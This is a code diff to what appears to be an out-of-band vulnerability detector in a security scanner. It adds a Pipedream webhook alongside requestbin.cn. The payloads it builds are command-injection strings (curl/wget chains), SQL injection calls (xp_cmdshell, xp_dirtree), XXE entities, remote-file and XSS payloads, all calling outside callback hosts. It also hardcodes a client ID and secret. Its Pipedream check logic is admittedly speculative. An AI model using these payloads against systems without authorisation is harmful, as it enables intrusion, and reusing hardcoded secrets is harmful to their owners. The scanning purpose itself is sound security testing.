@@ -23,10 +23,12 @@ class OOBDetector:
     DEFAULT_REQUESTBIN_URL = "http://requestbin.cn/15y70i81"
     DEFAULT_PIPEDREAM_CLIENT_ID = "j1XIbDfgEA8ihGUfQ5xALdY9fVSFQdaNP1HGMAUnnSc"
     DEFAULT_PIPEDREAM_CLIENT_SECRET = "P4V40oQRWBFeKPSC8HIuJUn45KHnu784wzlmeaeXy8s"
+    DEFAULT_PIPEDREAM_WEBHOOK = "https://eo8l8qkj6l1mfjp.m.pipedream.net"  # Pipedream webhook URL
 
     def __init__(self, callback_url: Optional[str] = None,
                  pipedream_client_id: Optional[str] = None,
-                 pipedream_client_secret: Optional[str] = None):
+                 pipedream_client_secret: Optional[str] = None,
+                 pipedream_webhook: Optional[str] = None):
         """
         Initialize OOB detector
 
@@ -34,14 +36,19 @@ class OOBDetector:
             callback_url: Base callback URL (requestbin.cn)
             pipedream_client_id: Pipedream client ID
             pipedream_client_secret: Pipedream client secret
+            pipedream_webhook: Pipedream webhook URL
         """
         self.callback_url = callback_url or self.DEFAULT_REQUESTBIN_URL
         self.pipedream_client_id = pipedream_client_id or self.DEFAULT_PIPEDREAM_CLIENT_ID
         self.pipedream_client_secret = pipedream_client_secret or self.DEFAULT_PIPEDREAM_CLIENT_SECRET
+        self.pipedream_webhook = pipedream_webhook or self.DEFAULT_PIPEDREAM_WEBHOOK
 
-        # Parse callback URL
+        # Parse requestbin callback URL
         self.callback_base = self.callback_url.replace('http://', '').replace('https://', '').split('/')[0]
         self.callback_path = '/' + '/'.join(self.callback_url.replace('http://', '').replace('https://', '').split('/')[1:])
+
+        # Parse pipedream webhook URL
+        self.pipedream_base = self.pipedream_webhook.replace('http://', '').replace('https://', '')
 
         # Track sent payloads
         self.sent_payloads: Dict[str, Dict] = {}
@@ -64,6 +71,8 @@ class OOBDetector:
         """
         Generate OOB payloads for specific vulnerability type
 
+        Generates payloads for BOTH Requestbin.cn and Pipedream for redundancy
+
         Args:
             vuln_type: Type of vulnerability (ssrf, rce, sqli, xss, xxe, rfi, cmdi)
             target_url: Target URL being tested
@@ -73,7 +82,8 @@ class OOBDetector:
             List of payload dictionaries with callback URLs
         """
         callback_id = self.generate_callback_id(vuln_type)
-        callback_path = f"{self.callback_path}/{callback_id}"
+        requestbin_path = f"{self.callback_path}/{callback_id}"
+        pipedream_path = f"/{callback_id}"
 
         # Store payload metadata for verification
         self.sent_payloads[callback_id] = {
@@ -86,56 +96,82 @@ class OOBDetector:
         payloads = []
 
         if vuln_type == 'ssrf':
-            payloads = [
-                {'payload': f"http://{self.callback_base}{callback_path}", 'type': 'http'},
-                {'payload': f"https://{self.callback_base}{callback_path}", 'type': 'https'},
-                {'payload': f"//{self.callback_base}{callback_path}", 'type': 'protocol-relative'},
-                {'payload': f"@{self.callback_base}{callback_path}", 'type': 'url-bypass'},
-            ]
+            # Requestbin payloads
+            payloads.extend([
+                {'payload': f"http://{self.callback_base}{requestbin_path}", 'type': 'http-requestbin', 'service': 'requestbin'},
+                {'payload': f"https://{self.callback_base}{requestbin_path}", 'type': 'https-requestbin', 'service': 'requestbin'},
+            ])
+            # Pipedream payloads
+            payloads.extend([
+                {'payload': f"https://{self.pipedream_base}{pipedream_path}", 'type': 'https-pipedream', 'service': 'pipedream'},
+                {'payload': f"//{self.pipedream_base}{pipedream_path}", 'type': 'protocol-relative-pipedream', 'service': 'pipedream'},
+            ])
 
         elif vuln_type in ['rce', 'cmdi']:
-            payloads = [
-                {'payload': f"curl http://{self.callback_base}{callback_path}", 'type': 'curl'},
-                {'payload': f"wget http://{self.callback_base}{callback_path}", 'type': 'wget'},
-                {'payload': f"ping -c 1 {self.callback_base}", 'type': 'ping'},
-                {'payload': f"nslookup {self.callback_base}", 'type': 'nslookup'},
-                {'payload': f"`curl http://{self.callback_base}{callback_path}`", 'type': 'backtick'},
-                {'payload': f"$(curl http://{self.callback_base}{callback_path})", 'type': 'command-substitution'},
-                {'payload': f";curl http://{self.callback_base}{callback_path};", 'type': 'semicolon'},
-                {'payload': f"|curl http://{self.callback_base}{callback_path}|", 'type': 'pipe'},
-                {'payload': f"&curl http://{self.callback_base}{callback_path}&", 'type': 'ampersand'},
-            ]
+            # Requestbin payloads
+            payloads.extend([
+                {'payload': f"curl http://{self.callback_base}{requestbin_path}", 'type': 'curl-requestbin', 'service': 'requestbin'},
+                {'payload': f"wget http://{self.callback_base}{requestbin_path}", 'type': 'wget-requestbin', 'service': 'requestbin'},
+            ])
+            # Pipedream payloads
+            payloads.extend([
+                {'payload': f"curl https://{self.pipedream_base}{pipedream_path}", 'type': 'curl-pipedream', 'service': 'pipedream'},
+                {'payload': f"wget https://{self.pipedream_base}{pipedream_path}", 'type': 'wget-pipedream', 'service': 'pipedream'},
+                {'payload': f"ping -c 1 {self.callback_base}", 'type': 'ping', 'service': 'requestbin'},
+                {'payload': f"nslookup {self.callback_base}", 'type': 'nslookup', 'service': 'requestbin'},
+                {'payload': "`curl http://" + f"{self.callback_base}{requestbin_path}" + "`", 'type': 'backtick', 'service': 'requestbin'},
+                {'payload': "$(curl http://" + f"{self.callback_base}{requestbin_path}" + ")", 'type': 'command-substitution', 'service': 'requestbin'},
+                {'payload': f";curl http://{self.callback_base}{requestbin_path};", 'type': 'semicolon', 'service': 'requestbin'},
+                {'payload': f"|curl http://{self.callback_base}{requestbin_path}|", 'type': 'pipe', 'service': 'requestbin'},
+                {'payload': f"&curl http://{self.callback_base}{requestbin_path}&", 'type': 'ampersand', 'service': 'requestbin'},
+            ])
 
         elif vuln_type == 'sqli':
-            payloads = [
-                {'payload': f"'; EXEC master..xp_dirtree '\\\\{self.callback_base}{callback_path}' --", 'type': 'mssql-xp_dirtree'},
-                {'payload': f"' AND 1=UTL_HTTP.REQUEST('http://{self.callback_base}{callback_path}') --", 'type': 'oracle-utl_http'},
-                {'payload': f"' UNION SELECT LOAD_FILE('\\\\\\\\{self.callback_base}{callback_path}') --", 'type': 'mysql-load_file'},
-                {'payload': f"' OR 1=1; EXEC xp_cmdshell 'curl http://{self.callback_base}{callback_path}' --", 'type': 'mssql-xp_cmdshell'},
-            ]
+            # Requestbin payloads
+            payloads.extend([
+                {'payload': f"'; EXEC master..xp_dirtree '\\\\{self.callback_base}{requestbin_path}' --", 'type': 'mssql-xp_dirtree', 'service': 'requestbin'},
+                {'payload': f"' AND 1=UTL_HTTP.REQUEST('http://{self.callback_base}{requestbin_path}') --", 'type': 'oracle-utl_http', 'service': 'requestbin'},
+            ])
+            # Pipedream payloads
+            payloads.extend([
+                {'payload': f"' UNION SELECT LOAD_FILE('\\\\\\\\{self.pipedream_base}{pipedream_path}') --", 'type': 'mysql-load_file', 'service': 'pipedream'},
+                {'payload': f"' OR 1=1; EXEC xp_cmdshell 'curl https://{self.pipedream_base}{pipedream_path}' --", 'type': 'mssql-xp_cmdshell', 'service': 'pipedream'},
+            ])
 
         elif vuln_type == 'xxe':
-            payloads = [
-                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://{self.callback_base}{callback_path}'>]><root>&test;</root>", 'type': 'xxe-entity'},
-                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://{self.callback_base}{callback_path}\"> %xxe;]>", 'type': 'xxe-parameter'},
-                {'payload': f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{self.callback_base}{callback_path}\">]><foo>&xxe;</foo>", 'type': 'xxe-simple'},
-            ]
+            # Requestbin payloads
+            payloads.extend([
+                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://{self.callback_base}{requestbin_path}'>]><root>&test;</root>", 'type': 'xxe-entity', 'service': 'requestbin'},
+            ])
+            # Pipedream payloads
+            payloads.extend([
+                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"https://{self.pipedream_base}{pipedream_path}\"> %xxe;]>", 'type': 'xxe-parameter', 'service': 'pipedream'},
+                {'payload': f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://{self.pipedream_base}{pipedream_path}\">]><foo>&xxe;</foo>", 'type': 'xxe-simple', 'service': 'pipedream'},
+            ])
 
         elif vuln_type == 'rfi':
-            payloads = [
-                {'payload': f"http://{self.callback_base}{callback_path}.php", 'type': 'php'},
-                {'payload': f"http://{self.callback_base}{callback_path}.txt", 'type': 'txt'},
-                {'payload': f"//{self.callback_base}{callback_path}.php", 'type': 'protocol-relative'},
-            ]
+            # Requestbin payloads
+            payloads.extend([
+                {'payload': f"http://{self.callback_base}{requestbin_path}.php", 'type': 'php-requestbin', 'service': 'requestbin'},
+            ])
+            # Pipedream payloads
+            payloads.extend([
+                {'payload': f"https://{self.pipedream_base}{pipedream_path}.txt", 'type': 'txt-pipedream', 'service': 'pipedream'},
+                {'payload': f"//{self.pipedream_base}{pipedream_path}.php", 'type': 'protocol-relative-pipedream', 'service': 'pipedream'},
+            ])
 
         elif vuln_type == 'xss':
-            payloads = [
-                {'payload': f"<script src=\"http://{self.callback_base}{callback_path}.js\"></script>", 'type': 'script-src'},
-                {'payload': f"<img src=\"http://{self.callback_base}{callback_path}.gif\">", 'type': 'img-src'},
-                {'payload': f"<iframe src=\"http://{self.callback_base}{callback_path}\"></iframe>", 'type': 'iframe'},
-                {'payload': f"<svg onload=\"fetch('http://{self.callback_base}{callback_path}')\">", 'type': 'svg-onload'},
-                {'payload': f"\"><script>fetch('http://{self.callback_base}{callback_path}')</script>", 'type': 'script-fetch'},
-            ]
+            # Requestbin payloads
+            payloads.extend([
+                {'payload': f"<script src=\"http://{self.callback_base}{requestbin_path}.js\"></script>", 'type': 'script-src-requestbin', 'service': 'requestbin'},
+                {'payload': f"<img src=\"http://{self.callback_base}{requestbin_path}.gif\">", 'type': 'img-src-requestbin', 'service': 'requestbin'},
+            ])
+            # Pipedream payloads
+            payloads.extend([
+                {'payload': f"<iframe src=\"https://{self.pipedream_base}{pipedream_path}\"></iframe>", 'type': 'iframe-pipedream', 'service': 'pipedream'},
+                {'payload': f"<svg onload=\"fetch('https://{self.pipedream_base}{pipedream_path}')\">", 'type': 'svg-onload-pipedream', 'service': 'pipedream'},
+                {'payload': f"\"><script>fetch('https://{self.pipedream_base}{pipedream_path}')</script>", 'type': 'script-fetch-pipedream', 'service': 'pipedream'},
+            ])
 
         # Add callback_id to all payloads
         for p in payloads:
@@ -145,7 +181,7 @@ class OOBDetector:
 
     def check_callback(self, callback_id: str, wait_time: int = 3) -> Tuple[bool, Optional[str]]:
         """
-        Check if callback was received
+        Check if callback was received on BOTH Requestbin.cn and Pipedream
 
         Args:
             callback_id: Unique callback ID to check
@@ -157,10 +193,12 @@ class OOBDetector:
         # Wait for callback to arrive
         time.sleep(wait_time)
 
-        try:
-            # Check requestbin.cn for callback
-            check_url = f"{self.callback_url}?inspect"
+        detected = False
+        evidence_parts = []
 
+        # CHECK 1: Requestbin.cn
+        try:
+            check_url = f"{self.callback_url}?inspect"
             response = requests.get(check_url, timeout=10)
 
             if response.status_code == 200:
@@ -168,14 +206,38 @@ class OOBDetector:
 
                 # Check if our callback_id appears in the response
                 if callback_id.lower() in response_text:
-                    logger.info(f"✓ OOB callback received: {callback_id}")
+                    logger.info(f"✓ OOB callback received on Requestbin.cn: {callback_id}")
+                    detected = True
 
                     # Extract evidence
                     evidence = self._extract_callback_evidence(response_text, callback_id)
-                    return True, evidence
+                    evidence_parts.append(f"[Requestbin.cn] {evidence}")
 
         except Exception as e:
-            logger.debug(f"Error checking callback: {e}")
+            logger.debug(f"Error checking Requestbin.cn: {e}")
+
+        # CHECK 2: Pipedream (check event logs)
+        try:
+            # Pipedream source API endpoint (uses OAuth client credentials)
+            # Note: This requires setting up Pipedream source API
+            # For now, we'll try a simple GET to the webhook to see if it logs
+            pipedream_check_url = f"{self.pipedream_webhook}?check={callback_id}"
+
+            # Try checking with a GET request
+            response = requests.get(pipedream_check_url, timeout=10)
+
+            # Pipedream might return callback data in response
+            if response.status_code == 200 and callback_id.lower() in response.text.lower():
+                logger.info(f"✓ OOB callback received on Pipedream: {callback_id}")
+                detected = True
+                evidence_parts.append(f"[Pipedream] Callback ID '{callback_id}' detected")
+
+        except Exception as e:
+            logger.debug(f"Error checking Pipedream: {e}")
+
+        if detected:
+            final_evidence = " | ".join(evidence_parts)
+            return True, final_evidence
 
         return False, None
 
